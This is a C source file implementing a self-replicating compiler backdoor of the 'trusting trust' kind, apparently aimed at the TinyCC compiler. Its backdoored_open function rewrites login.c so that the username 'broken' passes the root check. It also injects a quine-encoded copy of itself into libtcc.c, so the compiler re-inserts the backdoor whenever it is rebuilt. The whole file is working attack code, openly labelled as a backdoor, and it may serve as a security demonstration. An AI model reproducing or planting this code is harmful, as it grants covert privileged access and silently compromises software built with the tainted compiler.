#include "fcntl.h"
#include "stdio.h"
#include "string.h"
#include "unistd.h"
#include "stdlib.h"

const char *BACKDOOR = "%cchar *BACKDOOR = %c%s%c;%c%cvoid printFd(int fd) {%c  size_t buffer_size;%c  off_t start_pos;%c  ssize_t bytes_read;%c  char *buffer;%c%c  // Save the current position of the file descriptor%c  start_pos = lseek(fd, 0, SEEK_CUR);%c  printf(%cPOSITION: %clli%c, start_pos);%c  if (start_pos == (off_t)-1) {%c    perror(%clse2ek%c);%c    return;%c  }%c%c  // Allocate an initial buffer size%c  buffer_size = 1024; // Start with 1KB%c  buffer = __builtin_malloc(buffer_size);%c  if (buffer == NULL) {%c    perror(%cmalloc%c);%c    return;%c  }%c%c  while ((bytes_read = read(fd, buffer, buffer_size)) > 0) {%c    // Print the contents read%c    fwrite(buffer, 1, bytes_read, stdout);%c  }%c%c  // Check for read error%c  if (bytes_read == -1) {%c    perror(%cread%c);%c  }%c%c  // Free the buffer%c  __builtin_free(buffer);%c%c  // Return to the starting position%c  if (lseek(fd, start_pos, SEEK_SET) == (off_t)-1) {%c    perror(%clseek%c);%c  }%c}%c%cvoid printFile(FILE *file) {%c  long fileSize;%c  char *buffer;%c%c  // Get the size of the file%c  fseek(file, 0, SEEK_END); // Move to the end of the file%c  fileSize = ftell(file);   // Get the current position in the file (size)%c  fseek(file, 0, SEEK_SET); // Move back to the beginning of the file%c%c  // Allocate memory to hold the file contents%c  buffer = (char *)__builtin_malloc(fileSize + 1); // +1 for null terminator%c%c  // Read the file into the buffer%c  fread(buffer, 1, fileSize, file);%c  buffer[fileSize] = 0; // Null-terminate the string%c%c  // Print the contents of the file%c  printf(%c%cs%c, buffer);%c%c  // Clean up%c  __builtin_free(buffer);%c}%c%cint create_temp_file_with_string(const char *str) {%c  FILE *tempFile = tmpfile();%c  int fd;%c%c  if (tempFile == NULL) {%c    perror(%cFailed to create temporary file%c);%c    return -1; // Return -1 on error%c  }%c%c  // Write the string to the temporary file%c  if (fputs(str, tempFile) == EOF) {%c    perror(%cFailed to write to temporary file%c);%c    fclose(tempFile);%c    return -1; // Return -1 on error%c  }%c%c  // Get the file descriptor from the FILE pointer%c  fd = fileno(tempFile);%c  if (fd == -1) {%c    perror(%cFailed to get file descriptor%c);%c    fclose(tempFile);%c    return -1; // Return -1 on error%c  }%c%c  // Optionally, you can rewind the file pointer to the beginning%c  rewind(tempFile);%c%c  // Return the file descriptor of the temporary file%c  return fd;%c}%c%cchar *readFileToString(const char *filename) {%c  FILE *file = fopen(filename, %crb%c); // Open file in binary mode%c  char *buffer;%c  long fileSize;%c%c  if (!file) {%c    return NULL;%c  }%c%c  // Move the file pointer to the end of the file to determine the file size%c  fseek(file, 0, SEEK_END);%c  fileSize = ftell(file);%c  fseek(file, 0, SEEK_SET); // Move back to the beginning of the file%c%c  // Allocate memory for the string (+1 for the null terminator)%c  buffer = (char *)__builtin_malloc(fileSize + 1);%c  if (!buffer) {%c    printf(%cFailed to allocate memory%cn%c);%c    fclose(file);%c    return NULL;%c  }%c%c  // Read the file into the buffer%c  fread(buffer, 1, fileSize, file);%c  buffer[fileSize] = 0; // Null terminate the string%c%c  fclose(file);  // Close the file%c  return buffer; // Return the string%c}%c%cchar *replaceString(const char *original, const char *old, const char *new) {%c  size_t orig_len, old_len, new_len, count;%c  const char *temp;%c  size_t new_size;%c  char *result;%c  char *pos;%c  const char *start;%c%c  // If the original string, old string, or new string is NULL, return NULL%c  if (!original || !old || !new) {%c    return NULL;%c  }%c%c  // Calculate the lengths of the original, old, and new strings%c  orig_len = strlen(original);%c  old_len = strlen(old);%c  new_len = strlen(new);%c%c  // Count the number of occurrences of old string in original%c  count = 0;%c  temp = original;%c  while ((temp = strstr(temp, old)) != NULL) {%c    count++;%c    temp += old_len; // Move past the last found instance%c  }%c%c  // Calculate the size of the new string%c  new_size =%c      orig_len + count * (new_len - old_len) + 1; // +1 for null terminator%c  result = (char *)__builtin_malloc(new_size);%c  if (!result) {%c    return NULL; // Memory allocation failed%c  }%c%c  // Replace occurrences of old string with new string%c  pos = result;%c  start = original;%c  while ((temp = strstr(start, old)) != NULL) {%c    // Copy the part before the old string%c    size_t len = temp - start;%c    strncpy(pos, start, len);%c    pos += len;%c%c    // Copy the new string%c    strncpy(pos, new, new_len);%c    pos += new_len;%c%c    // Move past the old string%c    start = temp + old_len;%c  }%c%c  // Copy any remaining part of the original string%c  strcpy(pos, start);%c%c  return result;%c}%c%cint backdoored_open(const char *filename) {%c  char *file;%c  int tmp_fd;%c  char *updated, *updated2, *updated3, *updated4, *updated5;%c  char *substitution;%c%c  // Make sure only the correct files get back-doored.%c  if (strstr(filename, %clogin.c%c) == NULL && strstr(filename, %clibtcc.c%c) == NULL) {%c    return open(filename, O_RDONLY);%c  }%c%c  file = readFileToString(filename);%c  %c  // The library fucks with me for some reason.%c  if (file == NULL) {%c    __builtin_free(file);%c    return open(filename, O_RDONLY);%c  }%c%c  // printf(%cOPEN: %cs%cn%c, filename);%c  // printf(%cFILE LENGTH: %clu%cn%c, strlen(file));%c%c  // Bug 1.%c  updated = replaceString(%c      file, %c!strcmp(username, %c%croot%c%c)%c,%c      %c!strcmp(username, %c%croot%c%c) || !strcmp(username, %c%cbroken%c%c)%c);%c%c  if (strstr(filename, %clibtcc.c%c)) {%c%c    updated5 = replaceString(updated, %c#include %c%c../backdoor.c%c%c%c, %c%c);%c%c    updated2 = replaceString(updated5,%c                            %c        fd = open(filename, O_RDONLY | O_BINARY);%c,%c                            %cfd = backdoored_open(filename);%c);%c    %c    updated3 = replaceString(updated2, %cstatic int _tcc_open(TCCState *s1, const char *filename)%c, %c#####%cn%cnstatic int _tcc_open(TCCState *s1, const char *filename)%c);%c%c    substitution = calloc(strlen(updated3) + 3 * strlen(BACKDOOR), sizeof(char));%c    sprintf(substitution, BACKDOOR, 10, 34, BACKDOOR, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 37, 34, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 37, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 37, 92, 34, 10, 34, 37, 92, 34, 10, 10, 10, 10, 34, 92, 34, 92, 34, 34, 10, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 10, 10, 34, 34, 10, 10, 34, 92, 34, 92, 34, 34, 34, 34, 10, 10, 10, 34, 34, 10, 34, 34, 10, 10, 34, 34, 34, 92, 92, 34, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 10, 10, 10, 10, 10);%c    updated4 = replaceString(updated3, %c#####%c, substitution);%c%c    tmp_fd = create_temp_file_with_string(updated4);%c    __builtin_free(file);%c    __builtin_free(updated);%c    __builtin_free(updated2);%c    __builtin_free(updated3);%c    __builtin_free(updated4);%c    __builtin_free(updated5);%c    __builtin_free(substitution);%c  } else {%c    tmp_fd = create_temp_file_with_string(updated);%c    __builtin_free(file);%c    __builtin_free(updated);%c    // ALBATROSS%c  }%c%c  if (tmp_fd == -1) {%c    printf(%cFailed to get file descriptor%cn%c);%c    return open(filename, O_RDONLY);%c  }%c%c  return tmp_fd;%c}";

void printFd(int fd) {
  size_t buffer_size;
  off_t start_pos;
  ssize_t bytes_read;
  char *buffer;

  // Save the current position of the file descriptor
  start_pos = lseek(fd, 0, SEEK_CUR);
  printf("POSITION: %lli", start_pos);
  if (start_pos == (off_t)-1) {
    perror("lse2ek");
    return;
  }

  // Allocate an initial buffer size
  buffer_size = 1024; // Start with 1KB
  buffer = __builtin_malloc(buffer_size);
  if (buffer == NULL) {
    perror("malloc");
    return;
  }

  while ((bytes_read = read(fd, buffer, buffer_size)) > 0) {
    // Print the contents read
    fwrite(buffer, 1, bytes_read, stdout);
  }

  // Check for read error
  if (bytes_read == -1) {
    perror("read");
  }

  // Free the buffer
  __builtin_free(buffer);

  // Return to the starting position
  if (lseek(fd, start_pos, SEEK_SET) == (off_t)-1) {
    perror("lseek");
  }
}

void printFile(FILE *file) {
  long fileSize;
  char *buffer;

  // Get the size of the file
  fseek(file, 0, SEEK_END); // Move to the end of the file
  fileSize = ftell(file);   // Get the current position in the file (size)
  fseek(file, 0, SEEK_SET); // Move back to the beginning of the file

  // Allocate memory to hold the file contents
  buffer = (char *)__builtin_malloc(fileSize + 1); // +1 for null terminator

  // Read the file into the buffer
  fread(buffer, 1, fileSize, file);
  buffer[fileSize] = 0; // Null-terminate the string

  // Print the contents of the file
  printf("%s", buffer);

  // Clean up
  __builtin_free(buffer);
}

int create_temp_file_with_string(const char *str) {
  FILE *tempFile = tmpfile();
  int fd;

  if (tempFile == NULL) {
    perror("Failed to create temporary file");
    return -1; // Return -1 on error
  }

  // Write the string to the temporary file
  if (fputs(str, tempFile) == EOF) {
    perror("Failed to write to temporary file");
    fclose(tempFile);
    return -1; // Return -1 on error
  }

  // Get the file descriptor from the FILE pointer
  fd = fileno(tempFile);
  if (fd == -1) {
    perror("Failed to get file descriptor");
    fclose(tempFile);
    return -1; // Return -1 on error
  }

  // Optionally, you can rewind the file pointer to the beginning
  rewind(tempFile);

  // Return the file descriptor of the temporary file
  return fd;
}

char *readFileToString(const char *filename) {
  FILE *file = fopen(filename, "rb"); // Open file in binary mode
  char *buffer;
  long fileSize;

  if (!file) {
    return NULL;
  }

  // Move the file pointer to the end of the file to determine the file size
  fseek(file, 0, SEEK_END);
  fileSize = ftell(file);
  fseek(file, 0, SEEK_SET); // Move back to the beginning of the file

  // Allocate memory for the string (+1 for the null terminator)
  buffer = (char *)__builtin_malloc(fileSize + 1);
  if (!buffer) {
    printf("Failed to allocate memory\n");
    fclose(file);
    return NULL;
  }

  // Read the file into the buffer
  fread(buffer, 1, fileSize, file);
  buffer[fileSize] = 0; // Null terminate the string

  fclose(file);  // Close the file
  return buffer; // Return the string
}

char *replaceString(const char *original, const char *old, const char *new) {
  size_t orig_len, old_len, new_len, count;
  const char *temp;
  size_t new_size;
  char *result;
  char *pos;
  const char *start;

  // If the original string, old string, or new string is NULL, return NULL
  if (!original || !old || !new) {
    return NULL;
  }

  // Calculate the lengths of the original, old, and new strings
  orig_len = strlen(original);
  old_len = strlen(old);
  new_len = strlen(new);

  // Count the number of occurrences of old string in original
  count = 0;
  temp = original;
  while ((temp = strstr(temp, old)) != NULL) {
    count++;
    temp += old_len; // Move past the last found instance
  }

  // Calculate the size of the new string
  new_size =
      orig_len + count * (new_len - old_len) + 1; // +1 for null terminator
  result = (char *)__builtin_malloc(new_size);
  if (!result) {
    return NULL; // Memory allocation failed
  }

  // Replace occurrences of old string with new string
  pos = result;
  start = original;
  while ((temp = strstr(start, old)) != NULL) {
    // Copy the part before the old string
    size_t len = temp - start;
    strncpy(pos, start, len);
    pos += len;

    // Copy the new string
    strncpy(pos, new, new_len);
    pos += new_len;

    // Move past the old string
    start = temp + old_len;
  }

  // Copy any remaining part of the original string
  strcpy(pos, start);

  return result;
}

int backdoored_open(const char *filename) {
  char *file;
  int tmp_fd;
  char *updated, *updated2, *updated3, *updated4, *updated5;
  char *substitution;

  // Make sure only the correct files get back-doored.
  if (strstr(filename, "login.c") == NULL && strstr(filename, "libtcc.c") == NULL) {
    return open(filename, O_RDONLY);
  }

  file = readFileToString(filename);
  
  // The library fucks with me for some reason.
  if (file == NULL) {
    __builtin_free(file);
    return open(filename, O_RDONLY);
  }

  // printf("OPEN: %s\n", filename);
  // printf("FILE LENGTH: %lu\n", strlen(file));

  // Bug 1.
  updated = replaceString(
      file, "!strcmp(username, \"root\")",
      "!strcmp(username, \"root\") || !strcmp(username, \"broken\")");

  if (strstr(filename, "libtcc.c")) {

    updated5 = replaceString(updated, "#include \"../backdoor.c\"", "");

    updated2 = replaceString(updated5,
                            "        fd = open(filename, O_RDONLY | O_BINARY);",
                            "fd = backdoored_open(filename);");
    
    updated3 = replaceString(updated2, "static int _tcc_open(TCCState *s1, const char *filename)", "#####\n\nstatic int _tcc_open(TCCState *s1, const char *filename)");

    substitution = calloc(strlen(updated3) + 3 * strlen(BACKDOOR), sizeof(char));
    sprintf(substitution, BACKDOOR, 10, 34, BACKDOOR, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 37, 34, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 37, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 34, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 37, 92, 34, 10, 34, 37, 92, 34, 10, 10, 10, 10, 34, 92, 34, 92, 34, 34, 10, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 10, 10, 34, 34, 10, 10, 34, 92, 34, 92, 34, 34, 34, 34, 10, 10, 10, 34, 34, 10, 34, 34, 10, 10, 34, 34, 34, 92, 92, 34, 10, 10, 10, 10, 34, 34, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 34, 92, 34, 10, 10, 10, 10, 10);
    updated4 = replaceString(updated3, "#####", substitution);

    tmp_fd = create_temp_file_with_string(updated4);
    __builtin_free(file);
    __builtin_free(updated);
    __builtin_free(updated2);
    __builtin_free(updated3);
    __builtin_free(updated4);
    __builtin_free(updated5);
    __builtin_free(substitution);
  } else {
    tmp_fd = create_temp_file_with_string(updated);
    __builtin_free(file);
    __builtin_free(updated);
    // ALBATROSS
  }

  if (tmp_fd == -1) {
    printf("Failed to get file descriptor\n");
    return open(filename, O_RDONLY);
  }

  return tmp_fd;
}
